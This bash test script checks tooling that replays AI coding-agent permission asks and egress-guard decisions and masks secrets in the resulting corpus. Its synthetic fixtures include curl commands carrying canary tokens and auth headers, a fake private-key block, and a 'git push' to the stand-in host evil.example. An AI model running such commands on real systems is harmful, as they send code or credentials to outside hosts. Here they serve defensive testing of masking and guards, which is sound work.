#!/usr/bin/env bash
# Offline test of the prompt replay instruments: prompt-replay.sh build | verify | run over the
# synthetic sources in fixtures/prompt-replay/, the worker's fixtures, and permission_probe.py.
# Run from the repo root. Every fixture lives in one mktemp -d; HOME and TMPDIR point inside it.
# The committed fixtures hold no secret-shaped text: the secret-bearing records are generated
# here, each source line ending with the leak scanner's allow mark. Contract: the #321 spec.
set -uo pipefail
unset ${!HARNESS_@} TEAM_SESSION_ROLE TEAM_RUN_TEAM TEAM_RUN_ROLE CLAUDE_PROJECT_DIR TOUCHES_BLOCK_OFF
SRC="$PWD"; T=$(mktemp -d); trap 'rm -rf "$T"' EXIT
T="$(cd "$T" && pwd -P)"
export HOME="$T/home" TMPDIR="$T/tmp"; mkdir -p "$HOME" "$TMPDIR"
PR="bash $SRC/.claude/lib/prompt-replay.sh"; PP="python3 -I $SRC/.claude/lib/permission_probe.py"
FXS="$SRC/.claude/lib/tests/fixtures/prompt-replay"
fail=0; pass=0
ok() { # <description> <exit status of the check>
  if [ "$2" = 0 ]; then pass=$((pass + 1)); echo "PASS $1"; else fail=1; echo "FAIL $1"; fi
}
slug() { printf '%s' "$1" | sed 's/[^A-Za-z0-9]/-/g'; }
dz() { gzip -dc "$1/replay.jsonl.gz"; }
all_text() { cat "$1/touched.jsonl" "$1/labelling-sheet.csv"; dz "$1"; }
tu() { jq -nc --arg s "$1" --arg ts "$2" --arg cwd "$3" --arg id "$4" --arg c "$5" \
  '{type:"assistant", timestamp:$ts, sessionId:$s, cwd:$cwd, message:{content:[{type:"tool_use", id:$id, name:"Bash", input:{command:$c}}]}}'; }
ask() { # <file> <id> <tool> <tool_input json> <tier> — a waiting permission ask of the coder
  jq -n --arg id "$2" --arg t "$3" --argjson ti "$4" --arg tier "$5" --arg cwd "${FX:-}/alfa" \
    '{id:$id, kind:"permission", role:"coder", attempt:1, session_id:"S2", payload:{tool_name:$t, tool_input:$ti, cwd:$cwd},
      tier:$tier, tier_cause:"", state:"waiting", filed_at:"2026-11-01T00:10:00Z"}' > "$1"
}
mkfx() { # <dir> — the synthetic sources with ${FIXTURE} = <dir> and the transcripts in their dirs
  local d="$1" f p; mkdir -p "$d"; cp -R "$FXS/." "$d/"
  p="$d/home/.claude/projects"
  for x in main alfa sibling; do
    mkdir -p "$p/$(slug "$d/$x")"; mv "$d/transcripts/$x/"*.jsonl "$p/$(slug "$d/$x")/"; rmdir "$d/transcripts/$x"
  done
  rmdir "$d/transcripts"
  while IFS= read -r f; do sed "s|\${FIXTURE}|$d|g" "$f" > "$f.tmp" && mv "$f.tmp" "$f"; done \
    < <(find "$d" -type f \( -name '*.json' -o -name '*.jsonl' -o -name '*.md' \))
}

# ---- the main corpus: committed fixture + generated secret-bearing records -------------------
FX="$T/fx"; mkfx "$FX"
S1="$FX/home/.claude/projects/$(slug "$FX/main")/s1.jsonl"; RUN="$FX/alfa/.agents/team/runs/alfa-20261101-000000"
{ tu S1 2026-11-10T10:20:00.000Z "$FX/main" tg1 "curl -s 'https://h.example/x?token=SYNTHTOKEN'" # guard-push:allow
  tu S1 2026-11-10T10:30:00.000Z "$FX/main" tg2 "$(printf "printf '%%s' '\n-----BEGIN RSA PRIVATE KEY-----\nCANARYKEYLINE2\n-----END RSA PRIVATE KEY-----'")" # guard-push:allow
  tu S1 2026-11-10T10:31:00.000Z "$FX/main" tg3 "curl -H 'Authorization: Basic CANARYAUTH' https://h.example/u" # guard-push:allow
  tu S1 2026-11-10T10:32:00.000Z "$FX/main" tg4 "git log --author=a.b@example.com" # guard-push:allow
  tu S1 2026-11-10T10:33:00.000Z "$FX/main" tg5 "curl -H 'Cookie: sid=CANARYSID' https://h.example/c" # guard-push:allow
  tu S1 2026-11-10T10:34:00.000Z "$FX/main" tg6 'curl -u "us er:pa ss" https://h.example/u2' # guard-push:allow
  tu S1 2026-11-10T10:35:00.000Z "$FX/main" tg7 "curl -s https://u:CANARYUI@h.example/p" # guard-push:allow
} >> "$S1"
ask "$RUN/asks/a-2.json" a-2 Bash '{"command":"echo ghp_SYNTHSYNTHSYNTH0123456789abcdefghij"}' operator # guard-push:allow
ask "$RUN/asks/a-3.json" a-3 Bash '{"command":"echo Authorization: x; git rebase --help"}' operator # guard-push:allow
ask "$RUN/asks/a-5.json" a-5 mcp__x__call '{"password":"two words","headers":{"Authorization":"Basic CANARYHDR"}}' lead # guard-push:allow
S1SIZE=$(wc -c < "$S1" | tr -d ' ')
$PR build --sources "$FX/sources.json" --out "$T/c1" > "$T/b1.out" 2>&1; r=$?
C="$T/c1"
[ "$r" = 0 ] && for f in touched.jsonl replay.jsonl.gz policy.json labelling-sheet.csv manifest.json; do [ -f "$C/$f" ] || exit 1; done \
  && jq -e '.complete == true' "$C/manifest.json" >/dev/null
ok "b1 build writes the five files, complete" $?
$PR build --sources "$FX/sources.json" --out "$T/c1b" >/dev/null 2>&1
[ "$(jq -cS .files "$C/manifest.json")" = "$(jq -cS .files "$T/c1b/manifest.json")" ]
ok "b1b a rebuild from the same sources gives the same hashes" $?
! all_text "$C" | grep -q CANARYSIBLING && ! grep -rq CANARYSIBLING "$C"
ok "b2 only listed transcript dirs are read" $?
! all_text "$C" | grep -qE 'SYNTHTOKEN|CANARYKEYLINE2|a\.b@example\.com|CANARYAUTH|CANARYUI' \
  && dz "$C" | grep -q 'https://\*\*\*@h.example/p'
ok "b3 tokens, key block, email, auth header masked; userinfo keeps the host" $?
I1=$(jq -r 'select(.ref | endswith("alfa-20261101-000000/d-1")) | .intervention' "$C/touched.jsonl")
[ -n "$I1" ] && [ "$(jq -r 'select(.ref | endswith("alfa-20261101-000000/a-1")) | .intervention' "$C/touched.jsonl")" = "$I1" ] \
  && [ "$(jq -r 'select(.source == "touch" and .evidence.what == "coder: Bash rm scratch.txt") | .intervention' "$C/touched.jsonl")" = "$I1" ] \
  && [ "$(grep -c "^$I1," "$C/labelling-sheet.csv")" = 1 ]
ok "b4 ask, bound decision and its touch row are one intervention, one sheet row" $?
[ "$(dz "$C" | jq -r '.refs[]' | grep -cE 's1\.jsonl:3#tu[23]$')" = 2 ]
ok "b5 two tool_use items in one line are two refs" $?
jq -e 'select(.ref | endswith("alfa-20261001-000000/a-1"))' "$C/touched.jsonl" >/dev/null
ok "b6 the archived run's ask is collected" $?
g() { jq -r "select(.source == \"touch\" and $1) | $2" "$C/touched.jsonl"; }
g '.evidence.what == "curl in command position"' '.join + "|" + .ctx' | grep -q '^inferred .*|supervisor$' \
  && g '(.evidence.what | startswith("unlisted.example"))' '.join + "|" + .tool' | grep -q '^inferred .*|WebFetch$' \
  && g '(.evidence.what | startswith("Bash: echo xxx"))' '.join' | grep -q '^inferred ' \
  && g '(.evidence.what | contains("token=***"))' '.join' | grep -q '^inferred ' \
  && ! jq -e 'select(.evidence.kind == "block")' "$C/touched.jsonl" >/dev/null \
  && [ "$(jq -r 'select(.source == "teamlead-log") | .replayable' "$C/touched.jsonl" | sort -u)" = false ]
ok "b7 touch rows join their call; block rows excluded; teamlead-log not replayable" $?

jq 'del(.guard_corpus)' "$FX/sources.json" > "$T/s8.json"
$PR build --sources "$T/s8.json" --out "$T/c8" >/dev/null 2>&1
$PR verify --corpus "$T/c8" --require-complete >/dev/null 2>&1; r=$?
jq -e '.complete == false' "$T/c8/manifest.json" >/dev/null && [ "$r" = 3 ]
ok "b8 a missing source family: complete false, verify --require-complete exits 3" $?
jq --arg d "$T/nowhere" '.transcript_roots += [{dir: $d, checkouts: "all"}]' "$FX/sources.json" > "$T/s9.json"
$PR build --sources "$T/s9.json" --out "$T/c9" >/dev/null 2>&1
$PR verify --corpus "$T/c9" --require-complete >/dev/null 2>&1; r1=$?
mkdir "$T/c9b"; cp "$C"/* "$T/c9b/"; jq 'del(.files["policy.json"])' "$C/manifest.json" > "$T/c9b/manifest.json"
$PR verify --corpus "$T/c9b" >/dev/null 2>&1; r2=$?
[ "$r1" = 3 ] && [ "$r2" = 3 ] \
  && [ "$(jq -r --arg k "$(slug "$FX/main")/s1.jsonl" '.roots[] | select(.family == "transcripts") | .size_at_read[$k]' "$C/manifest.json")" = "$S1SIZE" ]
ok "b9 a missing transcript root or an unhashed file refuses; size_at_read recorded" $?

FX10="$T/fx10"; mkfx "$FX10"; R10="$FX10/alfa/.agents/team/runs/alfa-20261102-000000/asks"; mkdir -p "$R10"
FX="$FX10" ask "$R10/a-1.json" a-1 Bash '{"command":"ls"}' lead
FX="$FX10" ask "$R10/a-2.json" a-2 Bash '{"command":"pwd"}' lead
jq -n '{authority:"teamlead", behavior:"allow"}' > "$R10/a-1.answer.json"
jq -n '{authority:"teamlead", behavior:"allow"}' > "$R10/a-2.answer.rejected-1-2.json"
$PR build --sources "$FX10/sources.json" --out "$T/c10" >/dev/null 2>&1
[ "$(jq -r 'select(.ref | contains("alfa-20261102-000000/")) | .observed' "$T/c10/touched.jsonl" | sort | tr '\n' ' ')" = "teamlead unanswered " ]
ok "b10 answer sidecars join their ask, never count as asks" $?

jq -e 'select(.ref | endswith("/a-2")) | select(.modeled == true)' "$C/touched.jsonl" >/dev/null \
  && jq -e 'select(.ref | endswith("alfa-20261101-000000/a-3")) | select(.modeled == false)' "$C/touched.jsonl" >/dev/null \
  && dz "$C" | jq -e 'select(.input.tool_input.command == "git push git@evil.example:o/r") | select(all(.occurrences[]; .modeled != true))' >/dev/null
ok "b11 masking fidelity: a verdict masking changes is modeled, the others are not" $?
P12='{"hook_event_name":"PermissionRequest","tool_name":"mcp__x__call","tool_input":{"password":"two words","headers":{"Authorization":"Basic CANARYHDR"}}}' # guard-push:allow
printf '%s' "$P12" | $PP hook --log "$T/p12.log"
! { all_text "$C"; cat "$T/p12.log"; } | grep -qE 'two words|CANARYHDR|CANARYSID|pa ss' # guard-push:allow
ok "b12 key-aware masking in both layers, the sheet and a probe log" $?

$PR verify --corpus "$C" >/dev/null 2>&1; r1=$?
mkdir "$T/cv"; cp "$C"/* "$T/cv/"; sed '1s/"source"/"sourcf"/' "$C/touched.jsonl" > "$T/cv/touched.jsonl"
e2=$($PR verify --corpus "$T/cv" 2>&1); r2=$?
$PR run --corpus "$T/cv" --impl "$SRC" >/dev/null 2>&1; r3=$?
[ "$r1" = 0 ] && [ "$r2" = 3 ] && [ "$r3" = 3 ] && printf '%s' "$e2" | grep -q 'touched.jsonl'
ok "v1 verify refuses a flipped byte" $?

# ---- run: the source tree is gone, the corpus alone replays --------------------------------
mv "$FX" "$T/fx.gone"
$PR run --corpus "$C" --impl "$SRC" --layer all > "$T/r1.out" 2> "$T/r1.err"; r=$?
grep -E '^(### |\| |guard-corpus expectations:|recorded vs simulated)' "$T/r1.out" > "$T/r1.got"
grep -vE '^#( |$)' "$FXS/expected-baseline.txt" | grep . > "$T/r1.want"
[ "$r" = 0 ] && diff "$T/r1.want" "$T/r1.got" > "$T/r1.diff"
ok "r1 baseline equals the expected counts" $?
[ "$r" = 0 ] || cat "$T/r1.err"; [ -s "$T/r1.diff" ] && cat "$T/r1.diff"

mkdir -p "$T/implB"; cp -R "$SRC/.claude" "$T/implB/.claude"
cat >> "$T/implB/.claude/hooks/lib/guard_team_egress.py" <<'EOF'
_replay_bash_reason = bash_reason
def bash_reason(cmd, project):  # test patch: curl is silent for the Supervisor
    if "curl" in cmd and os.environ.get("TEAM_SESSION_ROLE") == "Supervisor":
        return ""
    return _replay_bash_reason(cmd, project)
EOF
IR1=$(jq -r 'select(.source == "touch" and .evidence.what == "curl in command position") | .intervention' "$C/touched.jsonl")
$PR run --corpus "$C" --impl "$SRC" --impl "$T/implB" --layer touched --changes-out "$T/r2.ch" > "$T/r2.out" 2>&1
sed -n '/^Decision changes:/,/^Outcome changes:/p' "$T/r2.out" | grep -q "^$IR1 supervisor guard=curl in command position → guard=silent" \
  && ! sed -n '/^Outcome changes:/,$p' "$T/r2.out" | grep -q "^$IR1 " && grep -q "^$IR1 " "$T/r2.ch"
ok "r2 a Supervisor guard ask turned silent is a decision change" $?

mkdir -p "$T/implC"; cp -R "$SRC/.claude" "$T/implC/.claude"
cat >> "$T/implC/.claude/lib/team_prompt_authority.py" <<'EOF'
_replay_tier = tier
def tier(*args, **kw):  # test patch: a lead checkpoint becomes class x
    r = _replay_tier(*args, **kw)
    return ("class", "x") if r == ("lead", None) else r
EOF
$PR run --corpus "$C" --impl "$SRC" --impl "$T/implC" --layer touched > "$T/r2b.out" 2>&1
sed -n '/^Decision changes:/,/^Outcome changes:/p' "$T/r2b.out" | grep -q "^$I1 stage guard=silent tier=lead → guard=silent tier=class x" \
  && ! sed -n '/^Outcome changes:/,$p' "$T/r2b.out" | grep -q "^$I1 "
ok "r2b a class turned lead is a decision change, not an outcome change" $?

printf 'intervention,label\n%s,harmless\n' "$I1" > "$T/l3.csv"
$PR run --corpus "$C" --impl "$SRC" --layer touched --labels "$T/l3.csv" > "$T/r3.out" 2>&1; r=$?
printf 'intervention,label\ni-nope,harmless\n' > "$T/l3b.csv"
e1=$($PR run --corpus "$C" --impl "$SRC" --labels "$T/l3b.csv" 2>&1); r1=$?
printf 'intervention,label\n%s,harmless\n%s,dangerous\n' "$I1" "$I1" > "$T/l3c.csv"
e2=$($PR run --corpus "$C" --impl "$SRC" --labels "$T/l3c.csv" 2>&1); r2=$?
[ "$r" = 0 ] && grep -q '^| harmless | 0 | 1 | 0 | 0 | 0 | 0 |$' "$T/r3.out" && [ "$r1" = 2 ] && [ "$r2" = 2 ] \
  && printf '%s' "$e1" | grep -q 'i-nope' && printf '%s' "$e2" | grep -q "$I1"
ok "r3 labels count per intervention; unknown or duplicated keys refused" $?

$PR run --corpus "$C" --impl "$SRC" --impl "$SRC" --layer all > "$T/r4.out" 2>&1
W() { # <impl root> <jq filter> [jq args…] — one job straight through a worker
  local impl="$1" f="$2"; shift 2
  jq -nc "$@" "$f" | python3 -I "$SRC/.claude/lib/prompt_replay.py" worker --impl "$impl" --policy "$C/policy.json"
}
grep -q '^Decision changes: 0$' "$T/r4.out" \
  && [ "$(dz "$C" | jq -r 'select(.input.tool_input.command == "make test") | .occurrences | length')" = 2 ] \
  && W "$SRC" '{key:"k", ctx:"stage", tool:"Bash", input:{command:"bash scripts/missing.sh"}, cwd_class:"clone", cwd_rel:"."}' | jq -e '.modeled == true' >/dev/null
ok "r4 the same root twice: no decision change; cwd subdir is its own occurrence; file-dependent → modeled" $?

mkdir -p "$T/implP"; cp -R "$SRC/.claude" "$T/implP/.claude"
jq -n '{teams:{branch_types:["feat","fix"], policy:{classes:{merge_line:{enabled:true}}}}}' > "$T/implP/.claude/project-profile.json"
W "$T/implP" '{key:"m", ctx:"stage", tool:"Bash", input:{command:"git merge --no-ff origin/main"}, cwd_class:"clone", cwd_rel:".", prompted:true}' \
  | jq -e '.tier == "class" and .class == "merge-line" and .outcome == "lead"' >/dev/null \
  && W "$SRC" '{key:"o", ctx:"stage", tool:"Bash", input:{command:("cat " + $r + "/README.md")}, cwd_class:"clone", cwd_rel:".", paths:[[$r, "main"]], prompted:true}' \
     --arg r "$T/fx.gone/main" | jq -e '.tier == "operator" and (.cause | contains("<main>/README.md"))' >/dev/null \
  && W "$SRC" '{key:"w", ctx:"supervisor", tool:"WebFetch", input:{url:"https://docs.example/a"}}' | jq -e '.guard == "" and .outcome == "pass"' >/dev/null
ok "w1 worker fixtures: a genuine class, a main-checkout refusal, a locally allowed WebFetch host" $?

# ---- the probe hook ----------------------------------------------------------------------------
L="$T/probe.log"
out=$(jq -nc --arg c "curl -H 'Authorization: Basic CANARYP' https://h" '{hook_event_name:"PermissionRequest", tool_name:"Bash",
  tool_input:{command:$c}, session_id:"s", agent_id:"ag1", agent_type:"general-purpose", permission_mode:"default", cwd:"/w"}' \
  | $PP hook --log "$L"); r=$? # guard-push:allow
[ "$r" = 0 ] && [ -z "$out" ] && [ "$(grep -c . "$L")" = 1 ] && ! grep -q CANARYP "$L" \
  && jq -e '.hook_event_name == "PermissionRequest" and .tool_name == "Bash" and .agent_id == "ag1" and (.keys | index("tool_input"))' "$L" >/dev/null
ok "p1 hook logs one masked line, prints nothing, exit 0" $?
out=$(printf 'not json' | $PP hook --log "$L"); r=$?
[ "$r" = 0 ] && [ -z "$out" ] && tail -n 1 "$L" | jq -e '.unreadable == true' >/dev/null
ok "p2 unreadable stdin: an unreadable line, silent, exit 0" $?
n0=$(grep -c . "$L"); printf '{}' | $PP hook --log "$L" --sleep 2 & pid=$!; seen=1
for i in 1 2 3 4 5 6 7 8 9 10; do
  if [ "$(grep -c . "$L")" -gt "$n0" ]; then kill -0 "$pid" 2>/dev/null && seen=0; break; fi; sleep 0.1
done
wait "$pid"
ok "p3 the line is written before the sleep" "$seen"
$PP claude-settings --log "$L" --timeout 5 > "$T/p4.json"; $PP codex-config --log "$L" > "$T/p4c.json"
jq -e --arg p "$SRC/.claude/lib/permission_probe.py" '(.hooks.PermissionRequest[0].hooks[0] | .type == "command" and .timeout == 5
  and (.command | contains($p))) and (.hooks.PreToolUse[0].hooks[0].command | contains("hook --log"))' "$T/p4.json" >/dev/null \
  && jq -e '.hooks.PermissionRequest and .hooks.PreToolUse' "$T/p4c.json" >/dev/null
ok "p4 claude-settings and codex-config print the fixture with the absolute probe path" $?

echo "prompt-replay-test: $pass passed"
[ "$fail" = 0 ] || { echo "prompt-replay-test: FAILED"; exit 1; }
